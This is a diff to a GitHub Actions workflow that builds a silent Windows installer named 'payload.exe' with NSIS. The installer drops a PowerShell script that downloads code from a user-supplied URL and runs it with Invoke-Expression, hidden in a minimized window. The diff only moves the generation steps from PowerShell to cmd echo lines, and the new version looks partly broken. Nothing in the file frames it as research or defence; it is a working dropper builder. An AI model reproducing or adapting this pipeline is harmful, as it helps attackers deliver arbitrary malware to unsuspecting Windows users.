@@ -1,4 +1,4 @@
-name: Build PowerShell EXE using NSIS
+name: Build PowerShell EXE using NSIS (CMD Only)
 
 on:
   workflow_dispatch:
@@ -17,38 +17,28 @@ jobs:
       uses: actions/checkout@v3
 
     - name: Install NSIS
-      shell: powershell
+      shell: cmd
       run: choco install nsis -y
 
-    - name: Generate PowerShell script
-      shell: powershell
+    - name: Generate PowerShell Script
+      shell: cmd
       run: |
-        $payloadUrl = "${{ github.event.inputs.payload_url }}"
-        $scriptPath = "script.ps1"
-        Set-Content -Path $scriptPath -Value "function Fetch-Execute {"
-        Add-Content -Path $scriptPath -Value "    param ([string]`$url)"
-        Add-Content -Path $scriptPath -Value "    try {"
-        Add-Content -Path $scriptPath -Value "        `$response = (New-Object System.Net.WebClient).DownloadString(`$url)"
-        Add-Content -Path $scriptPath -Value "        Invoke-Expression `$response"
-        Add-Content -Path $scriptPath -Value "    } catch {"
-        Add-Content -Path $scriptPath -Value "        Write-Host `"Error: Cannot fetch or execute script.`""
-        Add-Content -Path $scriptPath -Value "    }"
-        Add-Content -Path $scriptPath -Value "}"
-        Add-Content -Path $scriptPath -Value "Fetch-Execute -url `"$payloadUrl`""
+        echo $url = "${{ github.event.inputs.payload_url }}" > script.ps1
+        echo $response = (New-Object System.Net.WebClient).DownloadString($url) >> script.ps1
+        echo Invoke-Expression $response >> script.ps1
 
     - name: Generate NSIS Script
-      shell: powershell
+      shell: cmd
       run: |
-        $nsisPath = "script.nsi"
-        Set-Content -Path $nsisPath -Value '!define OUTPUT "payload.exe"'
-        Add-Content -Path $nsisPath -Value 'Outfile "${OUTPUT}"'
-        Add-Content -Path $nsisPath -Value 'SilentInstall silent'
-        Add-Content -Path $nsisPath -Value 'RequestExecutionLevel user'
-        Add-Content -Path $nsisPath -Value 'Section'
-        Add-Content -Path $nsisPath -Value '  SetOutPath $TEMP'
-        Add-Content -Path $nsisPath -Value '  File "script.ps1"'
-        Add-Content -Path $nsisPath -Value '  nsExec::Exec "powershell.exe -ExecutionPolicy RemoteSigned -File $TEMP\script.ps1"'
-        Add-Content -Path $nsisPath -Value 'SectionEnd'
+        echo !define OUTPUT "payload.exe" > script.nsi
+        echo Outfile "${OUTPUT}" >> script.nsi
+        echo SilentInstall silent >> script.nsi
+        echo RequestExecutionLevel user >> script.nsi
+        echo Section >> script.nsi
+        echo   SetOutPath $TEMP >> script.nsi
+        echo   File "script.ps1" >> script.nsi
+        echo   nsExec::Exec "cmd.exe /c start /min cmd /c %TEMP%\script.ps1" >> script.nsi
+        echo SectionEnd >> script.nsi
 
     - name: Build EXE using NSIS
       shell: cmd
@@ -59,3 +49,4 @@ jobs:
       with:
         name: payload_exe
         path: payload.exe
+
